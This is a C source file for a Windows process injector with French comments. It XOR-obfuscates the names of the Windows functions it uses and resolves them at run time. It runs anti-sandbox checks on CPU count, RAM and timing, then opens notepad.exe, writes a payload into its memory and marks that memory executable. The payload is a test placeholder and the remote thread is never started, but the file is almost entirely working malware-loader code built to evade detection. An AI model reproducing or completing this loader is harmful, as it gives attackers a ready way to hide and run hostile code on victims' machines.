// ============================================================================
// INCLUDES AND DEFINES
// ============================================================================
#include <windows.h>
#include <stdio.h>
#include <unistd.h>
#include "nt.h"
#include <tlhelp32.h>


// ============================================================================
// DEBUG MODE CONFIGURATION
// ============================================================================
int DEBUG_MODE = 1; // 1 to enable debug, 0 to disable

#define DEBUG(x, ...) if (DEBUG_MODE) { printf(x, ##__VA_ARGS__); }



// ============================================================================
// FONCTION DEFINITIONS
// ============================================================================
HANDLE getProcHandlebyName(LPCSTR procName, DWORD* PID) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    NTSTATUS status = 0;
    HANDLE hProc = 0;
    // Get a list of all currently running process
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!snapshot) {
        DEBUG("[Process Searching] Failed to retrieve the %s process\n", procName);
        return NULL;
    }
    if (Process32First(snapshot, &entry)) {
        do {
            // Parse each process information
            if (strcmp((entry.szExeFile), procName) == 0) {
                // Retrieve the PID of the right process
                *PID = entry.th32ProcessID;
                DEBUG("[Process Searching] Injecting into : %d\n", *PID);
                // Open an handle on this process
                HANDLE hProc = openProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
                if (!hProc) { continue; }
                return hProc;
            }
        } while (Process32Next(snapshot, &entry));
    }
    return NULL;
}


// ============================================================================
// ENCRYPTED DATA
// ============================================================================
// Toutes les fonctions/variables API sont chiffrées avec XOR (clé: 0x35)

unsigned char encryptedVirtualAllocEx[] = {
    0x63, 0x5c, 0x47, 0x41, 0x40, 0x54, 0x59, 0x74, 0x59, 0x59, 0x5a, 0x56, 0x70, 0x4d, 0x35
};

unsigned char encryptedOpenProcess[] = {
    0x7a, 0x45, 0x50, 0x5b, 0x65, 0x47, 0x5a, 0x56, 0x50, 0x46, 0x46, 0x35
};

unsigned char encryptedVirtualProtectEx[] = {
    0x63, 0x5c, 0x47, 0x41, 0x40, 0x54, 0x59, 0x65, 0x47, 0x5a, 0x41, 0x50, 0x56, 0x41, 0x70, 0x4d, 0x35
};

unsigned char encryptedWriteProcessMemory[] = {
    0x62, 0x47, 0x5c, 0x41, 0x50, 0x65, 0x47, 0x5a, 0x56, 0x50, 0x46, 0x46, 0x78, 0x50, 0x58, 0x5a, 0x47, 0x4c, 0x35
};

unsigned char encryptedCreateRemoteThread[] = {
    0x76, 0x47, 0x50, 0x54, 0x41, 0x50, 0x67, 0x50, 0x58, 0x5a, 0x41, 0x50, 0x61, 0x5d, 0x47, 0x50, 0x54, 0x51, 0x35
};

unsigned char encryptedGetModuleHandleA[] = {
    0x72, 0x50, 0x41, 0x78, 0x5a, 0x51, 0x40, 0x59, 0x50, 0x7d, 0x54, 0x5b, 0x51, 0x59, 0x50, 0x74, 0x35
};

unsigned char encryptedGetProcAddress[] = {
    0x72, 0x50, 0x41, 0x65, 0x47, 0x5a, 0x56, 0x74, 0x51, 0x51, 0x47, 0x50, 0x46, 0x46, 0x35
};

unsigned char encryptedKernel32[] = {
    0x5e, 0x50, 0x47, 0x5b, 0x50, 0x59, 0x06, 0x07, 0x1b, 0x51, 0x59, 0x59, 0x35
};

unsigned char encryptedNotepad_exe[] = {
    0x7b, 0x5a, 0x41, 0x50, 0x45, 0x54, 0x51, 0x1b, 0x50, 0x4d, 0x50, 0x35
};
// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

/**
 * Déchiffre une chaîne chiffrée avec XOR
 * @param encrypted: Tableau de bytes chiffrés
 * @param length: Longueur du tableau
 * @param key: Clé XOR
 */
void decrypt(unsigned char* encrypted, size_t length, unsigned char key) {
    for (size_t i = 0; i < length; i++) {
        encrypted[i] ^= key;
    }
}


// ============================================================================
// CONFIGURATION CONSTANTS
// ============================================================================
int TRHESHOLD_MAX_CPU = 2;
int TRHESHOLD_MIN_RAM_MB = 2048;

int main(void) {


    // ------------------------------------------------------------------------
    // INITIALIZATION
    // ------------------------------------------------------------------------
    DEBUG("[Initialization - Start] Starting injector...\n");
    DEBUG("[Initialization - Debug] Debug mode is: %s\n", DEBUG_MODE ? "ENABLED" : "DISABLED");

    // Payload de test
    size_t scLength = 8;
    unsigned char scBytes[] = { 0x90, 0x90, 0x90, 0x90, 0xDE, 0xAD, 0xBE, 0xEF };
    size_t szOutput;
    DEBUG("[Initialization - Payload] Payload length: %zu bytes\n", scLength);

    // Decrypt VIRTUALALLOC function name
    unsigned char key = 0x35;
    DEBUG("[Initialization - Decryption] XOR key: 0x%02X\n", key);


    // ------------------------------------------------------------------------
    // SANDBOXING DETECTION
    // ------------------------------------------------------------------------
    DEBUG("[Sandboxing Detection - Start] Running anti-sandbox checks...\n");

    // Check CPU count
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DEBUG("[Sandboxing Detection - CPU] Detected %lu processors (threshold: %d)\n",
          systemInfo.dwNumberOfProcessors, TRHESHOLD_MAX_CPU);
    if (systemInfo.dwNumberOfProcessors < TRHESHOLD_MAX_CPU) {
        DEBUG("[Sandboxing Detection  - Check CPU] Suspecious environment detected: %i processeurs.\n", systemInfo.dwNumberOfProcessors);
        //return 0;
    }

    // Check RAM size
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAM_MB = memoryStatus.ullTotalPhys / 1024 / 1024;
    DEBUG("[Sandboxing Detection - RAM] Detected %lu MB (threshold: %d MB)\n",
          RAM_MB, TRHESHOLD_MIN_RAM_MB);
    if (RAM_MB < TRHESHOLD_MIN_RAM_MB) {
        DEBUG("[Sandboxing Detection  - Check RAM] Environnement suspect detecte : %lu MB de RAM.\n", RAM_MB);
        //return 0;
    }


    // Detection time delay
    DEBUG("[Sandboxing Detection - Timing] Starting timing check...\n");
    ULONGLONG start = GetTickCount64();
    for (long i = 0; i < 100000000; i++) { i % 2; }
    ULONGLONG end = GetTickCount64();
    ULONGLONG elapsed = end - start;
    DEBUG("[Sandboxing Detection - Timing] Elapsed time: %llu ms (minimum: 10 ms)\n", elapsed);

    if (elapsed < 10) {
        DEBUG("[Sandboxing Detection - Timing] Sandbox detected, exiting...\n");
        printf("\nPress Enter to exit...\n");
        getchar();
        return 0;
    }
    DEBUG("[Sandboxing Detection - Complete] All checks passed\n");



    // Step 1: Decrypt all API strings
    DEBUG("[Decryption - Start] Decrypting all API strings...\n");
    decrypt(encryptedKernel32, sizeof(encryptedKernel32), key);
    DEBUG("[Decryption - Complete] Decrypted kernel32.dll string: %s\n", encryptedKernel32);
    decrypt(encryptedGetModuleHandleA, sizeof(encryptedGetModuleHandleA), key);
    DEBUG("[Decryption - Complete] Decrypted GetModuleHandleA string: %s\n", encryptedGetModuleHandleA);
    decrypt(encryptedGetProcAddress, sizeof(encryptedGetProcAddress), key);
    DEBUG("[Decryption - Complete] Decrypted GetProcAddress string: %s\n", encryptedGetProcAddress);
    decrypt(encryptedVirtualAllocEx, sizeof(encryptedVirtualAllocEx), key);
    DEBUG("[Decryption - Complete] Decrypted VirtualAllocEx string: %s\n", encryptedVirtualAllocEx);
    decrypt(encryptedOpenProcess, sizeof(encryptedOpenProcess), key);
    DEBUG("[Decryption - Complete] Decrypted OpenProcess string: %s\n", encryptedOpenProcess);
    decrypt(encryptedVirtualProtectEx, sizeof(encryptedVirtualProtectEx), key);
    DEBUG("[Decryption - Complete] Decrypted VirtualProtectEx string: %s\n", encryptedVirtualProtectEx);
    decrypt(encryptedWriteProcessMemory, sizeof(encryptedWriteProcessMemory), key);
    DEBUG("[Decryption - Complete] Decrypted WriteProcessMemory string: %s\n", encryptedWriteProcessMemory);
    decrypt(encryptedCreateRemoteThread, sizeof(encryptedCreateRemoteThread), key);
    DEBUG("[Decryption - Complete] Decrypted CreateRemoteThread string: %s\n", encryptedCreateRemoteThread);
    decrypt(encryptedNotepad_exe, sizeof(encryptedNotepad_exe), key);
    DEBUG("[Decryption - Complete] Decrypted Notepad.exe string: %s\n", encryptedNotepad_exe);
    DEBUG("[Decryption - Complete] All API strings decrypted\n");

    // Step 2: Dynamically resolve GetModuleHandleA and GetProcAddress
    DEBUG("[Dynamic Resolution - Start] Resolving core functions...\n");

    // Get kernel32.dll base address (still using GetModuleHandleA directly for bootstrap)
    HMODULE hKernel32 = GetModuleHandleA((LPCSTR)encryptedKernel32);
    if (hKernel32 == NULL) {
        DEBUG("[Dynamic Resolution - Error] Failed to get kernel32.dll handle\n");
        getchar(); return 1;
    }
    DEBUG("[Dynamic Resolution - Success] kernel32.dll handle: %p\n", hKernel32);

    // Step 3: Get VirtualAlloc function address
    DEBUG("[GetProcAddress - Start] Resolving VirtualAllocEx address...\n");
    pVirtualAllocEx myVirtualAlloc = (pVirtualAllocEx)GetProcAddress(hKernel32, (LPCSTR)encryptedVirtualAllocEx);

    if (myVirtualAlloc == NULL) {
        DEBUG("[GetProcAddress - Error] Erreur : GetProcAddress a echoue. Code d'erreur : %lu\n", GetLastError());
        getchar(); return 1;
    }
    DEBUG("[GetProcAddress - Success] Adresse de VirtualAlloc trouvee : %p\n", myVirtualAlloc);


    DEBUG("[GetProcAddress - Start] Resolving additional API functions...\n");
    openProcess = (pOpenProcess)GetProcAddress(hKernel32, (LPCSTR)encryptedOpenProcess);
    DEBUG("[GetProcAddress - API] OpenProcess: %p\n", openProcess);
    virtualProtectEx = (pVirtualProtectEx)GetProcAddress(hKernel32, (LPCSTR)encryptedVirtualProtectEx);
    DEBUG("[GetProcAddress - API] VirtualProtectEx: %p\n", virtualProtectEx);
    writeProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, (LPCSTR)encryptedWriteProcessMemory);
    DEBUG("[GetProcAddress - API] WriteProcessMemory: %p\n", writeProcessMemory);
    createRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, (LPCSTR)encryptedCreateRemoteThread);
    DEBUG("[GetProcAddress - API] CreateRemoteThread: %p\n", createRemoteThread);

    if (!openProcess || !virtualProtectEx || !writeProcessMemory || !myVirtualAlloc || !createRemoteThread) {
        DEBUG("[x] Cannot load all required functions\n");
        printf("\nPress Enter to exit...\n");
        getchar();
        return -1;
    }
    DEBUG("[GetProcAddress - Complete] All API functions resolved successfully\n");

    DEBUG("[Process Injection - Start] Beginning injection process...\n");
    DWORD PID = 0;
    HANDLE procHandle = getProcHandlebyName((LPCSTR)encryptedNotepad_exe, &PID);
    if (!procHandle) {
        DEBUG("[x] Failed to open the process\n");
        printf("\nPress Enter to exit...\n");
        getchar();
        return -1;
    }
    DEBUG("[+] Process handle: %p\n", procHandle);

    DEBUG("[Memory Allocation - Start] Allocating remote buffer...\n");
    PVOID remoteBuffer = myVirtualAlloc(procHandle, NULL, (SIZE_T)scLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuffer) {
        DEBUG("[x] Failed to allocate process memory: %d\n", GetLastError());
        printf("\nPress Enter to exit...\n");
        getchar();
        return -1;
    } else {
        DEBUG("[+] Remote buffer allocated at: %p\n", remoteBuffer);
        DEBUG("[Memory Allocation - Success] Buffer size: %zu bytes with RW permissions\n", scLength);
        sleep(10);
    }


    DEBUG("[Memory Write - Start] Writing payload to remote process...\n");
    int status = writeProcessMemory(procHandle, remoteBuffer, scBytes, scLength, &szOutput);
    if (!status) {
        DEBUG("[x] Failed to write process memory... : %d\n", GetLastError());
        printf("\nPress Enter to exit...\n");
        getchar();
        return -1;
    }
    DEBUG("[Memory Write - Success] Written %zu bytes to remote process\n", szOutput);


    DEBUG("[Memory Protection - Start] Changing memory protection to RX...\n");
    DWORD oldProtect;
    BOOL protectStatus = virtualProtectEx(procHandle, remoteBuffer, scLength, PAGE_EXECUTE_READ, &oldProtect);
    if (!protectStatus) {
        DEBUG("[x] Failed to reprotect the memory\n");
        printf("\nPress Enter to exit...\n");
        getchar();
        return -1;
    }
    DEBUG("[Memory Protection - Success] Memory protection changed (old: 0x%lX, new: PAGE_EXECUTE_READ)\n", oldProtect);

    DEBUG("[Process Injection - Complete] Injection successful!\n");
    printf("\nPress Enter to exit...\n");
    getchar();
    return 0;
}